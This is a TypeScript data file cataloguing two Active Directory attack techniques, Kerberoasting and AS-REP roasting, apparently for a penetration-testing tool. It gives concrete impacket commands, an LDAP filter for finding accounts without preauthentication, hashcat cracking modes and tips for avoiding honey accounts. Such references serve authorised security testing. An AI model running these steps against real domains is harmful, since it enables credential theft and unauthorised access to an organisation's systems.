/** Identity-AD techniques (early). */
import type { TechniqueEntry } from "./types.ts";

export const IDENTITY_AD_TECHNIQUES_EARLY: readonly TechniqueEntry[] = [
	{
		id: "ad-kerberoasting",
		name: "Kerberoasting (offline crack of service TGS)",
		domain: "identity-ad",
		mitre: ["T1558.003", "T1003"],
		cwe: ["CWE-522"],
		triggers:
			"Valid domain user, SPN-enabled service accounts (MSSQL, HTTP, CIFS), RC4-HMAC still enabled or AES keys crackable.",
		procedure: [
			"Enumerate SPN accounts: `GetUserSPNs.py <dom>/<user>:<pass> -request` (impacket) or `BloodHound` → find users with SPNs.",
			"Request TGS for each SPN: `GetUserSPNs.py -request -dc-ip <ip>` → capture `.kirbi`/hash.",
			"Offline crack with `hashcat -m 13100` (RC4) / `18200` (AES) / `14300` (etype 17) — prioritize weak service-account passwords.",
			"If cracked, use the account's privileges (DB access, file share, pivot).",
		],
		proofExit: "TGS extracted AND password cracked offline (hashcat recovered plaintext), account validated usable.",
		pitfalls: [
			"AES-256 etype 18 hashes are far harder — prefer RC4 if available; check etype before committing compute.",
			"Decoy/honey SPN accounts exist — corroborate the account is real and privileged before claiming impact.",
		],
		tools: ["impacket-secretsdump", "nxc", "bloodhound-python", "hashcat", "john"],
	},
	{
		id: "ad-asrep-roasting",
		name: "AS-REP roasting (preauth-disabled accounts)",
		domain: "identity-ad",
		mitre: ["T1558.004"],
		cwe: ["CWE-522", "CWE-287"],
		triggers:
			"Account has 'Do not require Kerberos preauthentication' set; you know its username (enum from LDAP/OSINT).",
		procedure: [
			"Enumerate preauth-disabled users via LDAP: `ldapsearch` filter `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`.",
			"Request AS-REP without preauth: `GetNPUsers.py <dom>/ -no-pass -usersfile users.txt`.",
			"Crack offline: `hashcat -m 18200`.",
		],
		proofExit: "AS-REP hash for a real account extracted AND cracked offline; account access validated.",
		pitfalls: [
			"Need the exact username; generic accounts often disabled — enumerate properly.",
			"Cracking difficulty = password strength; weak = win, strong = no.",
		],
		tools: ["ldapsearch", "impacket-secretsdump", "hashcat", "nxc"],
	},
];
